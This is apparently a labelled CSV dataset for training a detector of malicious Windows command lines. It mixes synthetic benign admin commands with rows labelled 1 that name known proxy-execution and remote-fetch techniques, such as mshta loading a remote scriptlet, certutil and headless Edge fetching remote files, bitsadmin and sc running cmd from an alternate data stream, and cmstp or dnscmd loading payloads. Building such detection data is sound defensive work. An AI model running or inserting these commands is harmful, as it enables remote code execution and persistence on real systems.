Command,Label
C:\Windows\System32\net.exe localgroup Administrators pgwnooqy /add,0
"tasklist | findstr ""winlogon.exe""",0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)               Gecko/20100101 Firefox/68.0,1
ping 192.168.206.7,0
MsoHtmEd.exe {REMOTEURL},1
dir.exe C:\Users\Documents,0
C:\Windows\icacls.exe backup.dat /grant Everyone:R,0
"echo %DATE% %TIME% >> ""C:\Users\lpen\Pictures\Desktop\zvxfkesodk.log""",0
set verbose on,0
"create lun raid [size=<n>] [drives=<n, n> [,...]] [stripesize=<n>] [noerr]",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Temp\jxcseznh.ini\"" \""D:\Program Files\mhxbftjwgq.txt\"""" /sc daily /st 23:00",0
"fsutil file layout ""C:\Temp\ueqbzpuix.dll""",0
"type.exe ""D:\Users\qrdggls\Downloads\fbxfhb.dll""",0
"findstr /C:""HldZzJT67C8W"" ""D:\Windows\gcwzg.sys""",0
"icacls.exe ""D:\Temp\hnongy.ini"" /grant Everyone:F",0
"E:\Windows\System32\type.exe ""D:\Users\knlh\Downloads\hxaahnh.txt""",0
evntcmd [/s <computername>] [/v <verbositylevel>] [/n] D:\AppData\Program Files\cclra.exe,0
ping.exe 192.168.219.64,0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
C:\Windows\net.exe user rmrbposn /add,0
"D:\Windows\fsutil.exe file layout ""D:\Logs\Program Files\sxyfnfbo.ini""",0
cmdkey /list,1
C:\Windows\net.exe user uyzwultt /add,0
"move ""D:\Program Files\xfnnmvli.dll"" ""D:\Program Files\Program Files\nunlltcu.txt""",0
net use Z: \\192.168.184.89\public,0
ping.exe 192.168.136.68,0
"copy.exe ""C:\Users\qgfscp.sys"" ""D:\Logs\jtycypv.dat""",0
C:\Windows\System32\ping.exe 10.0.0.1,0
ping 192.168.6.190,0
"echo.exe %DATE% %TIME% >> ""C:\Users\whwz\Documents\Downloads\olmritsrev.dll""",0
"icacls ""D:\Program Files\ombiee.txt"" /grant Everyone:F",0
"findstr.exe /i ""error"" backup.dat",0
"attrib.exe +h ""D:\AppData\AppData\szlckzbsl.log""",0
sqldumper.exe 464 0 0x0110,1
"type ""D:\Logs\Logs\nkvtpueme.log""",0
net user eyuipygk /add,0
msiexec /y {PATH_ABSOLUTE:.dll},1
"findstr.exe /i ""completed"" config.ini",0
"rmdir ""D:\Users\aukxd\Desktop\Pictures"" /s /q",0
"move ""C:\AppData\wliho.log"" ""D:\Program Files\Users\kuberxo.ini""",0
"attrib.exe +h ""D:\Windows\AppData\yhcvpwdklj.sys""",0
coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name,1
net.exe user knznhbzn /add,0
"C:\Windows\System32\copy.exe ""C:\AppData\AppData\qgdmk.ini"" ""C:\AppData\Users\akadhmrt.sys""",0
VSDiagnostics.exe start 1 /launch:{PATH:.exe},1
"powershell -Command ""Get-ChildItem -Path D:\Users\Program Files -Recurse | Select-Object FullName, Length""",0
"C:\Windows\System32\move.exe ""D:\Temp\nsaum.dat"" ""D:\Temp\Windows\bctgolw.dll""",0
"copy ""D:\Logs\AppData\qkkebfl.txt"" ""C:\Users\jemyoiz\Desktop\Desktop\jzoprnhi.log""",0
"move ""C:\Users\dinyi\Pictures\Pictures\xoniq.sys"" ""C:\Users\Temp\khfsfmu.exe""",0
add alias System1 {ff47165a-1946-4a0c-b7f4-80f46a309278},0
"C:\Windows\System32\powershell.exe -Command ""Get-Service""",0
"type ""C:\Users\Program Files\ywyyffjkz.txt""",0
"type ""C:\Temp\grchfkk.exe""",0
"move.exe ""D:\Logs\wmvztbmg.dll"" ""C:\Users\micljdu\Desktop\xcmzqopvf.sys""",0
net.exe user guest /add,0
Update.exe --updateRollback={PATH_SMB:folder},1
"echo.exe %DATE% %TIME% >> ""C:\Users\Users\wgdedfbmqp.dll""",0
D:\Windows\ping.exe 192.168.37.132,0
net.exe localgroup Administrators jysfvejf /add,0
"E:\Windows\System32\type.exe ""C:\Logs\uhtxdkgiv.txt""",0
"icacls.exe ""D:\Users\rnjaj\Documents\Pictures\uvvmfbwr.sys"" /grant Everyone:F",0
diskshadow/add/exit,0
"echo.exe %DATE% %TIME% >> ""C:\Windows\syiejqkdak.txt""",0
"del ""D:\Users\Program Files\aicraahwen.txt"" /f /q",0
"dissociate controllers <n> [,<n> [,...]]",0
"icacls.exe ""C:\Temp\ntdefclxl.dll"" /grant Everyone:F",0
"fsutil.exe file layout ""D:\Users\Program Files\qqoiyjee.ini""",0
"echo %DATE% %TIME% >> ""D:\AppData\ibyoi.ini""",0
tasklist.exe /v,0
"rmdir.exe ""C:\Program Files\Users"" /s /q",0
"findstr.exe /C:""DKLkl5dUjlB2"" ""C:\Windows\Program Files\jksnv.ini""",0
net.exe user gxssuxdu /add,0
ping.exe 192.168.32.57,0
C:\Program Files (x86)\ping.exe 10.0.0.1,0
C:\Windows\attrib.exe +r data.log,0
detail {hbaport | iadapter | iportal | provider | subsystem | controller | port | drive | lun | tportal | target | tpgroup} [verbose],0
"del ""D:\Program Files\Windows\onpoodouyy.dll"" /f /q",0
net localgroup Administrators ubgeaxue /add,0
"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path D:\Temp\Temp -Recurse | Select-Object FullName, Length""",0
C:\Program Files\attrib.exe +r backup.dat,0
msbuild.exe {PATH:.csproj},1
"attrib.exe +h ""C:\Windows\Program Files\ezkpp.log""",0
diskraid /Microsoft Diskraid version 5.2.xxxx,0
"type.exe ""D:\Program Files\Temp\jnfqflcb.ini""",0
"C:\Windows\copy.exe ""C:\Users\Users\maiouxpkc.sys"" ""C:\Logs\vxyjghnhi.txt""",0
"C:\Windows\copy.exe ""C:\Users\swqdfze\Downloads\unsxuryvnb.dat"" ""D:\Temp\Temp\qkayjgtm.ini""",0
"type.exe ""D:\Program Files\nawmwp.dat""",0
"icacls ""D:\Logs\wmlsupmxju.ini"" /grant Everyone:F",0
ping 192.168.109.185,0
ping.exe 192.168.124.164,0
"move.exe ""C:\AppData\AppData\mvvnuf.sys"" ""D:\Users\Users\ghnvl.txt""",0
"type.exe ""D:\AppData\AppData\vfnhjrmzmy.log""",0
"move ""C:\Users\uhxky\Documents\fbbba.ini"" ""D:\Logs\Users\pbtped.exe""",0
C:\Windows\System32\ipconfig.exe /all,0
net.exe use Z: \\192.168.0.204\public,0
ProtocolHandler.exe {REMOTEURL},1
"move.exe ""C:\Logs\fmxpzkiznk.log"" ""C:\Users\meolvmf\Pictures\cgyabs.dat""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\Temp\tshzw.exe\"" \""C:\Program Files\Program Files\yzsdonen.txt\"""" /sc daily /st 23:00",0
C:\Program Files\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
C:\Windows\fsutil.exe devdrv clearFiltersAllowed [[/f] <volume path>],0
net user jbdayqdx /add,0
cmd.exe /c dir D:\Data,0
"copy.exe ""C:\Users\fuqcclqk\Documents\Pictures\ugbbbvtg.log"" ""D:\Windows\iydyg.sys""",0
C:\Program Files (x86)\ping.exe 10.0.0.1,0
dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll},1
"rmdir ""C:\Program Files\Temp"" /s /q",0
"certutil.exe -hashfile ""D:\Program Files\AppData\bppnnio.txt"" SHA256",0
net.exe user twppkanm /add,0
"type ""C:\Users\nznrvrei\Desktop\Pictures\qbzwqzad.sys""",0
"copy.exe ""C:\Temp\mzyrd.dll"" ""D:\Logs\bbpzvcn.dat""",0
"del ""D:\Users\nxpslfuk\Documents\Pictures\nusytwx.exe"" /f /q",0
"E:\Windows\System32\dir.exe ""D:\Logs\Temp"" /s /b",0
net use Z: \\192.168.105.183\backup,0
chap target set secret=[dtYFbV6kjI6ilFZ5] [initiator=iqn.2025-11.com.example:zzdcklpj],0
C:\Program Files\net.exe localgroup Administrators admin /add,0
"C:\Windows\certutil.exe -hashfile ""D:\Users\valfk\Documents\Desktop\zhrbkp.txt"" SHA256",0
"findstr.exe /C:""qLAxnHwwX4dC"" ""D:\Program Files\Users\udoetro.ini""",0
winword.exe {REMOTEURL},1
net user mrezsrro /add,0
"C:\Windows\System32\certutil.exe -hashfile ""D:\Program Files\Program Files\odgpe.sys"" SHA256",0
repair disk=53 [align=53] [noerr],0
net.exe localgroup Administrators user1 /add,0
VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe},1
net.exe use Z: \\192.168.97.79\backup,0
"attrib.exe +h ""D:\Users\Windows\fjmph.dat""",0
ping.exe 192.168.63.17,0
"explorer.exe /root,""{PATH_ABSOLUTE:.exe}""",1
ping.exe 172.16.0.1,0
cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs,1
"C:\Windows\System32\powershell.exe -Command ""Get-ChildItem -Path D:\Logs\Logs -Recurse | Select-Object FullName, Length""",0
ping.exe 192.168.1.1,0
certutil.exe -hashfile document.txt SHA256,0
C:\Program Files (x86)\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"attrib.exe +h ""C:\Logs\AppData\btnhf.ini""",0
ping 192.168.251.152,0
attrib.exe +r config.ini,0
net.exe user farsqmqm /add,0
"fsutil.exe file layout ""D:\Temp\neagvbbyu.log""",0
"del ""D:\Logs\hjeulrubgm.txt"" /f /q",0
C:\Windows\tasklist.exe /v,0
add alias HOCOEYCG 774d7ce9-68ee-470b-a58c-4c9c80aaebb5,0
"del ""D:\Temp\AppData\ubwpaxxbfk.dat"" /f /q",0
"attrib.exe +h ""D:\AppData\Windows\yswuerrd.ini""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\Users\yqjkqrcwu.dll\"" \""D:\Logs\jxuqlw.exe\"""" /sc daily /st 23:00",0
net.exe user jebyenda /add,0
"dir ""C:\Logs""",0
"copy ""C:\Windows\Temp\zuiuuzi.dll"" ""D:\Logs\oqlnbgqtj.dat""",0
echo qbCPWmMlefpb > C:\Program Files\owzixs.exe,0
echo.exe 3Qe55UO65KWr > D:\Users\AppData\eowtj.dat,0
systeminfo.exe,0
tasklist.exe /v,0
net.exe localgroup Administrators guest /add,0
SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat},1
ping.exe 8.8.8.8,0
tasklist.exe /v,0
"C:\Windows\System32\type.exe ""D:\Logs\Program Files\cjwbgghebf.sys""",0
rem The first drive is a primary partition and is,0
net.exe user cgohelaj /add,0
"copy ""C:\Users\fmdpn\Pictures\Pictures\nqkphghwww.log"" ""D:\Users\azwjqvd.sys""",0
"move.exe ""C:\Users\Users\ispgrrzdxo.dat"" ""D:\Temp\grsjvl.dat""",0
"type ""D:\Temp\hareyw.dll""",0
"copy ""D:\Windows\Program Files\gsjsqtv.exe"" ""C:\AppData\Windows\yxhlxe.exe""",0
"echo %DATE% %TIME% >> ""D:\Users\fdrzcmgab.dll""",0
cmstp.exe /ni /s {PATH_ABSOLUTE:.inf},1
"fsutil file layout ""C:\Program Files\lrrnkorfif.sys""",0
"attrib +h ""C:\Windows\Users\bhenzwl.exe""",0
"dir.exe ""D:\Temp\Temp""",0
"attrib.exe +h ""D:\Logs\zbvik.ini""",0
findstr.exe Windows proposal.txt,0
"attrib.exe +h ""C:\Users\gfgqn.log""",0
"C:\Windows\System32\fsutil.exe file layout ""C:\Temp\Users\siojrahrt.dll""",0
ping.exe 192.168.151.71,0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"icacls ""C:\Logs\Windows\pqxbvrda.exe"" /grant Everyone:F",0
"C:\Windows\System32\findstr.exe /C:""UaSztaJ9LGpU"" ""C:\Windows\vwvhhzsfoa.log""",0
"mkdir.exe ""D:\Users\ohzgouc\Downloads\Downloads""",0
"del ""C:\Users\hxzorbw\Desktop\tohxfxvc.exe"" /f /q",0
"dir ""D:\Users\yenu\Pictures\Documents"" /s /b",0
echo z9T46vWY10Io > D:\AppData\enpne.txt,0
ping.exe 192.168.95.148,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Logs\rnybpg.sys\"" \""C:\Program Files\Program Files\bwxpns.dll\"""" /sc daily /st 23:00",0
"fsutil.exe file layout ""C:\AppData\jrmqnqs.ini""",0
"mkdir.exe ""D:\Program Files\Program Files""",0
C:\Windows\System32\net.exe use Z: \\192.168.95.32\public,0
"type.exe ""C:\Users\fkaegxksi.dat""",0
wfc.exe {PATH_ABSOLUTE:.xoml},1
"C:\Windows\System32\copy.exe ""D:\Users\gpmjzk.log"" ""C:\Temp\rvqqngw.txt""",0
ping.exe 192.168.203.120,0
arp.exe -a,0
echo.exe W0oeOk5POCGG > D:\Temp\AppData\fphrdqfyg.dat,0
"attrib.exe +h ""C:\Logs\xfalty.log""",0
Extrac32 [/Y] source [newname],0
msbuild.exe {PATH:.xml},1
whoami.exe /all,0
net localgroup Administrators wwodpyor /add,0
echo.exe 2UFeMyML9i4t > D:\Temp\Logs\lomxjx.log,0
net.exe user backup /add,0
"move.exe ""C:\Logs\Temp\xsjeimeq.dat"" ""C:\AppData\dkpbenskvf.log""",0
"findstr.exe /C:""fWgxQIIQWbIk"" ""D:\Temp\Logs\dlumhc.sys""",0
"echo %DATE% %TIME% >> ""D:\Windows\Windows\ammxgpar.ini""",0
"type.exe ""C:\Logs\Temp\odqbz.txt""",0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"copy.exe ""D:\Logs\Windows\nbixgnwht.ini"" ""C:\AppData\msbolu.txt""",0
"echo %DATE% %TIME% >> ""D:\Windows\Temp\rhggndpzmu.txt""",0
"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",1
bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,1
net.exe localgroup Administrators wcuwwnaw /add,0
"icacls.exe ""D:\Users\ewvkm.sys"" /grant Everyone:F",0
ping.exe 192.168.128.228,0
dtrace [-BCeFhlqSvVwYZ] [-b bufsz] [-c cmd] [-D name[=def]] [-I path],0
systeminfo.exe,0
net user bfxwiqwr /add,0
net.exe user ighnbktf /add,0
"C:\Windows\move.exe ""D:\Windows\Logs\fgivvhnqa.log"" ""C:\Users\vbkegjk\Desktop\heglgt.dat""",0
net.exe user jdxnhgal /add,0
"move ""D:\Users\zedpw\Downloads\Documents\cxcaoyai.log"" ""C:\Logs\sserzcmy.dll""",0
cmd.exe /c dir C:\Users\Documents,0
"attrib.exe +h ""D:\Windows\Program Files\sktsscyzpz.ini""",0
"powershell.exe -Command ""Get-Process""",0
"E:\Windows\System32\certutil.exe -hashfile ""D:\AppData\dmymtycj.txt"" SHA256",0
"copy ""C:\Windows\bsakb.log"" ""D:\Users\ddtvrcrst.txt""",0
"certutil.exe -hashfile ""D:\Temp\apotmmz.dll"" SHA256",0
C:\Windows\ipconfig.exe /all,0
ping.exe 192.168.181.144,0
"attrib +h ""C:\Program Files\gtlajpprsy.exe""",0
"certutil.exe -hashfile ""D:\Users\awtuoru\Desktop\jyxcm.dll"" SHA256",0
net.exe user xodsjuhx /add,0
conhost.exe {CMD},1
cmd.exe /c dir D:\Data,0
"dir.exe ""D:\Temp\Windows""",0
net.exe localgroup Administrators odqhpbsz /add,0
"dir ""D:\Users\xnxnmhjn\Desktop"" /s /b",0
"move ""C:\Temp\Logs\frooocio.txt"" ""D:\Logs\cgbuzteg.dll""",0
"sc config {ExistingServiceName} binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start {ExistingServiceName}",1
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\sakrk.ini\"" \""C:\Program Files\ygfmdhsqsr.log\"""" /sc daily /st 23:00",0
"mkdir ""C:\Logs\Windows""",0
C:\Windows\System32\netsh.exe advfirewall show allprofiles,0
"attrib +h ""D:\Logs\jqwdoq.exe""",0
"move ""D:\Logs\Users\lhlnzu.txt"" ""C:\Users\zpnzd\Documents\Pictures\euzisutke.exe""",0
"icacls.exe ""D:\Temp\Users\gskycw.log"" /grant Everyone:F",0
"move.exe ""D:\Windows\xkognovlf.dat"" ""D:\Temp\bixeroxnbh.dll""",0
ping.exe 192.168.154.18,0
net.exe use Z: \\192.168.100.173\data,0
"move.exe ""D:\Logs\nawhcnss.dll"" ""C:\Temp\lydvjdpvu.txt""",0
netstat.exe -an,0
"move ""D:\Users\Logs\pbarll.sys"" ""D:\Program Files\ksujj.txt""",0
"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();",1
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
mmc.exe -Embedding {PATH_ABSOLUTE:.msc},1
"mkdir ""C:\Users\ynkdilwr\Pictures""",0
"del ""D:\Logs\Program Files\mizpmambzq.exe"" /f /q",0
echo h8GTxNKuJiRV > D:\Program Files\fpybxazt.log,0
net.exe user azwuurmi /add,0
"del ""D:\Temp\wetvfwg.exe"" /f /q",0
net.exe localgroup Administrators htjevzuo /add,0
"C:\Windows\mkdir.exe ""D:\Program Files""",0
"findstr.exe /C:""S3BQ5BJR3dIB"" ""C:\Program Files\ghgdvm.txt""",0
"del ""D:\Logs\Windows\obggwh.log"" /f /q",0
ipconfig.exe /all,0
"C:\Windows\findstr.exe /C:""0ukc93C4qzvy"" ""D:\Temp\Program Files\amnsvnempk.sys""",0
dir.exe C:\Program Files,0
"certutil -hashfile ""C:\Logs\xqfcrrgd.log"" SHA256",0
C:\Windows\net.exe user backup /add,0
C:\Windows\attrib.exe +r backup.dat,0
systeminfo.exe,0
C:\Windows\System32\echo.exe bivIwh3LLYKj > D:\Program Files\yamiwwa.txt,0
net.exe localgroup Administrators admin /add,0
netstat.exe -an,0
"findstr.exe /C:""hrdmZvdiVw2Z"" ""D:\Windows\qlolplwpkz.txt""",0
wsl.exe -e /mnt/c/Windows/System32/calc.exe,1
netstat.exe -an,0
tasklist.exe /v,0
"attrib +h ""C:\Windows\jaatrxq.dat""",0
net use Z: \\192.168.12.97\backup,0
explorer.exe {PATH_ABSOLUTE:.exe},1
net.exe localgroup Administrators guest /add,0
"echo.exe %DATE% %TIME% >> ""D:\AppData\Logs\bylgnjzh.sys""",0
C:\Windows\System32\systeminfo.exe,0
C:\Windows\netsh.exe interface show interface,0
fsutil.exe wim [enumwims] C,0
findstr.exe /s /i /m \<comp.* *.*,0
"copy.exe ""D:\Users\aygwvw\Pictures\ecvtmcl.log"" ""D:\AppData\jvbzwrprxf.txt""",0
net use Z: \\192.168.143.221\public,0
"C:\Windows\System32\copy.exe ""C:\Program Files\peuxjzwo.dat"" ""C:\Windows\Windows\ydohqi.txt""",0
"copy ""C:\Program Files\kngitbtt.sys"" ""C:\Temp\Logs\pjljvt.txt""",0
vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll},1
netsh.exe advfirewall show allprofiles,0
"echo %DATE% %TIME% >> ""D:\AppData\wgrrajqwbg.txt""",0
echo Wvp6DFGviWDS > C:\Windows\Windows\lcafutw.exe,0
ScriptRunner.exe -appvscript {PATH_SMB:.cmd},1
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Temp\Users\qsrrhjpz.ini\"" \""D:\Windows\Logs\nkthgxwg.ini\"""" /sc daily /st 23:00",0
"icacls.exe ""C:\Users\vmevlwesh.ini"" /grant Everyone:F",0
"powershell -Command ""Get-WmiObject -Class Win32_Process -Filter 'name like \""%winlogon.exe%\""'""",0
"move ""D:\Users\jirdq\Documents\niwmcdtozv.txt"" ""C:\AppData\xpjvihnit.dll""",0
ping 192.168.79.239,0
ipconfig.exe /all,0
"findstr.exe /i ""warning"" config.ini",0
"type.exe ""D:\Logs\blowlhgcud.txt""",0
"del ""D:\Users\fbwha\Desktop\Documents\ufywmipq.txt"" /f /q",0
"echo %DATE% %TIME% >> ""D:\AppData\djorbsvv.log""",0
net.exe user yawxzunm /add,0
"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}",1
net localgroup Administrators ftmemvbe /add,0
"fsutil file layout ""C:\Users\AppData\knxakwrr.exe""",0
"certutil.exe -hashfile ""C:\Users\pjidy.ini"" SHA256",0
"findstr /C:""JarBgmj0vkiR"" ""D:\Temp\llrst.exe""",0
"dir ""D:\Users\sytwsqpo\Pictures\Desktop"" /s /b",0
"del ""D:\Temp\wxznbjx.sys"" /f /q",0
"icacls.exe ""C:\Program Files\Logs\pdkeoivee.ini"" /grant Everyone:F",0
"findstr.exe /C:""NR9ryzAADvLY"" ""D:\Users\Windows\hhiyo.log""",0
"lbpolicy set lun paths=D:\Temp-{primary | <weight>}[,D:\Temp-{primary | <weight>}[,…]]",0
"copy.exe ""C:\Users\Program Files\jmlzwig.dat"" ""D:\Users\xjbpaxw.log""",0
"del ""D:\Logs\gwathbk.ini"" /f /q",0
ping.exe 192.168.69.161,0
"fsutil file layout ""C:\Users\AppData\ufsrqrxi.dll""",0
dir.exe C:\Temp,0
LUN 5 is now the selected LUN.,0
ping.exe 192.168.127.6,0
fsutil.exe volume [dismount] C:\Temp,0
"mkdir.exe ""D:\Users\kamccq\Desktop""",0
"type ""C:\Windows\xjmjv.sys""",0
net.exe user btauvbrq /add,0
net.exe localgroup Administrators hwiqrzqh /add,0
"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Temp\Program Files -Recurse | Select-Object FullName, Length""",0
fc /b [C][C:\AppData]<filename1> [C][C:\AppData]<filename2>,0
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\System32\copy.exe \""D:\Program Files\Logs\khqujaapl.log\"" \""C:\Windows\Program Files\hmjmvt.dll\"""" /sc daily /st 23:00",0
E:\Windows\System32\echo.exe KksKZZj59MKZ > D:\Users\tahyyb.sys,0
"dir ""C:\Temp\Temp""",0
"powershell.exe -Command ""Get-ChildItem -Path C:\AppData\Logs -Recurse | Select-Object FullName, Length""",0
inactive,0
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct},1
"find /i ""PROMPT"" *.bat",0
ping.exe 192.168.58.55,0
net use Z: \\192.168.81.124\public,0
expand [-r] <source> <destination>,0
"fsutil.exe devdrv setFiltersAllowed [[/f] /volume D:\AppData] """"filter1, filter 2, ...""""",0
"type.exe ""D:\AppData\Temp\rykurhzow.txt""",0
echo.exe e998XdkRgg3f > D:\AppData\Program Files\iruvcsa.log,0
refresh provider,0
"certutil.exe -hashfile ""D:\Temp\Logs\bcydrjfwo.txt"" SHA256",0
net.exe localgroup Administrators kuuyxqsd /add,0
create lun automagic size=802 [noerr],0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"findstr /C:""cQgjnTV5VSPx"" ""C:\Temp\dgelssl.exe""",0
net.exe use Z: \\192.168.13.251\backup,0
dir.exe C:\Users\Documents,0
diskshadow/add/expose <shadowID> {<drive:> | <share> | <mountpoint>},0
"forfiles /P c:\ /S /M *.bat /C ""cmd /c echo @file is a batch file""",0
#pragma delete <eventlogfile> <eventsource> <eventID>,0
ping 192.168.16.139,0
tasklist.exe /v,0
"dir.exe ""D:\Users\euitqk\Documents\Downloads"" /s /b",0
echo.exe qWRK9P2nZ6Y7 > D:\Users\sibgqods\Desktop\xchggkm.log,0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\Users\Temp\legql.dat""",0
ping.exe 192.168.84.47,0
#Diskshadow script file,0
"move.exe ""C:\Windows\xmogk.log"" ""D:\Program Files\ddeog.log""",0
"echo.exe %DATE% %TIME% >> ""C:\Users\eadj\Documents\Pictures\ljzxbw.ini""",0
"del ""D:\AppData\whshlw.exe"" /f /q",0
"for /f ""usebackq delims=="" %i in (`set`) do @echo %i",0
"mkdir ""C:\Users\yorjmsk\Documents\Pictures""",0
"echo %DATE% %TIME% >> ""D:\Users\omeamvpfu.dll""",0
create partition logical size=2048,0
DISKRAID> SEL LUN 5,0
"dir.exe ""C:\Program Files\Temp"" /s /b",0
"for /r ""C:\My C:\Windows\dir.exe\"" %A in (*.*) do echo %~ftzA",0
"echo.exe %DATE% %TIME% >> ""C:\Windows\Users\czoqx.txt""",0
"dissociate controllers 760 [,760 [,...]]",0
netstat.exe -an,0
Msconfig.exe -5,1
net.exe user fhvqnsuq /add,0
diskshadow/add/reak [writable] <setid>,0
certutil.exe -hashfile document.txt SHA256,0
ping.exe 192.168.21.200,0
net.exe user rqfiujbi /add,0
flattemp /enable,0
ping.exe 192.168.196.15,0
"type.exe ""D:\Temp\Users\bxkcwxdtor.txt""",0
"certutil.exe -hashfile ""C:\Windows\ruovke.log"" SHA256",0
net.exe localgroup Administrators ounskees /add,0
ping.exe 192.168.222.230,0
wmic.exe process list brief,0
wmic.exe process list brief,0
"C:\Windows\System32\fsutil.exe file layout ""C:\Windows\Users\mgblldwzi.dll""",0
"certutil -hashfile ""D:\Users\ffxy\Pictures\Pictures\kyarvhka.sys"" SHA256",0
"type ""C:\Users\floaoihr\Downloads\Documents\mryzug.ini""",0
C:\Windows\fsutil.exe volume querycluster C: 50 0x2000,0
"move.exe ""D:\Users\Windows\djlzl.sys"" ""D:\Temp\pbxnxqandt.txt""",0
certutil.exe -hashfile data.log SHA256,0
"C:\Windows\System32\findstr.exe /C:""wMhecswaolks"" ""D:\Temp\Program Files\jfjmt.txt""",0
"copy ""D:\Users\nmlahru\Downloads\Documents\kjckt.dll"" ""D:\Windows\Program Files\aqpcd.ini""",0
"fsutil.exe file layout ""D:\Users\cwrqssnfgo.log""",0
"echo %DATE% %TIME% >> ""C:\AppData\Windows\xkunmnhi.dll""",0
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}""",1
"attrib.exe +h ""D:\Users\llkuu\Pictures\Desktop\qmxgbnqran.txt""",0
echo.exe AAlQfmQ5Aie1 > C:\Users\Program Files\ngrfklfwdi.dll,0
dir.exe C:\Users\Documents,0
netstat.exe -an,0
net use Z: \\192.168.31.246\public,0
"icacls.exe ""D:\Windows\yicdjkl.dat"" /grant Everyone:F",0
C:\Windows\System32\ping.exe 192.168.174.51,0
"attrib.exe +h ""D:\Logs\tbbxred.dat""",0
C:\Windows\System32\netstat.exe -an,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\AppData\dbpvxqjhr.exe\"" \""C:\Temp\AppData\kwnjgbxebm.dat\"""" /sc daily /st 23:00",0
"fsutil file layout ""C:\Users\AppData\noqrpoqoxk.exe""",0
net.exe localgroup Administrators fgqgddqa /add,0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\Logs\updvwxzxjq.sys""",0
"powershell.exe -Command ""Get-ChildItem -Path D:\Logs\Program Files -Recurse | Select-Object FullName, Length""",0
"attrib.exe +h ""C:\Windows\Users\prinnfs.sys""",0
net.exe localgroup Administrators hoovyfsm /add,0
"move ""D:\Users\khpiazs.exe"" ""D:\Users\daeyt\Desktop\amzpsmlxc.txt""",0
echo.exe 8rWBLhXPKE9w > D:\Temp\Program Files\rfjkd.sys,0
"rmdir.exe ""D:\Program Files\Temp"" /s /q",0
pcalua.exe -a {PATH_SMB:.dll},1
expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat},1
"copy.exe ""D:\AppData\wmpsrpeqg.sys"" ""D:\AppData\gkyajdxlp.dll""",0
"powershell.exe -Command ""Get-Service""",0
certutil.exe -hashfile config.ini SHA256,0
prompt $p$g,0
C:\Windows\echo.exe [on | off],0
certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe},1
